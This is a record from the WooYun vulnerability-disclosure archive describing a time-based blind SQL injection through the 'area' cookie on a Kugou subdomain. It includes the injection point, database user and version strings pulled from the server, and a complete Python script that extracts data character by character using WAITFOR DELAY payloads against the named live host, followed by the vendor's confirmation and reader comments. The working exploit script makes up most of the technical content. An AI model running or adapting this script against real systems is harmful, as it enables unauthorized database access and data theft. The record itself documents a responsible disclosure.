{"id": 48735, "wybug_id": "wooyun-2014-081844", "wybug_title": "酷狗分站MSSQL盲注一枚（附Python验证脚本）", "wybug_corp": "酷狗", "wybug_author": "lijiejie", "wybug_date": "2014-11-03 15:33", "wybug_open_date": "2014-12-18 15:36", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向公众公开  简要描述： 酷狗分站MSSQL盲注一枚，有脚本有真相... 详细说明：  注入点位于：\nGET http://huodong.5sing.kugou.com/Cookie: area=asfasfas\n参数area可注入。Cookie注入一枚。   漏洞证明：  猜解当前数据库用户system_user,前20个字符，得到：\nweb5singdbman\n猜解数据库版本前29个字符：\nSQL Server version is Microsoft SQL Server 2008 SP\n\n\n脚本附上：\nimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)payloads += list(string.ascii_uppercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.', '-', '\\\\', ' ']print 'Try to retrive SQL Server Version:'user = ''for i in range(1,30,1):    for payload in payloads:        timeout_count = 0        for j in range(1,3):            try:                conn = httplib.HTTPConnection('huodong.5sing.kugou.com', timeout=3)                random.seed()                area = str(random.random()) + \"fasfa'; if (ascii(substring(@@version,%s,1))=%s) waitfor delay '0:0:5' -- \"  % (i, ord(payload))                headers['Cookie'] = \"area=\" + urllib.quote(area)                start_time = time.time()                conn.request(method='GET',                             url= '/Default.aspx',                             headers = headers)                conn.getresponse()                conn.close()                print '.',                break            except:                timeout_count += 1        if timeout_count == 2:    # 2 times to confirm            user += payload            print '[In Progress]', user             breakprint '\\n[Done], SQL Server version is', user\n   修复方案：  过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-11-04 14:44 厂商回复： 感谢提交! 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-03 22:15 |    \t\t龍 、 \t\t\t( 普通白帽子  |\t\t\t        Rank:398 漏洞数:135        | 你若安好  我就是晴天)\t\t \n  Python神器    \n     2014-11-03 23:24 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  有神器    \n     2014-12-10 17:32 |    \t\t行者_travis \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专职测试，安全测试。想搞搞其它的)\t\t \n  python神器，学习了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}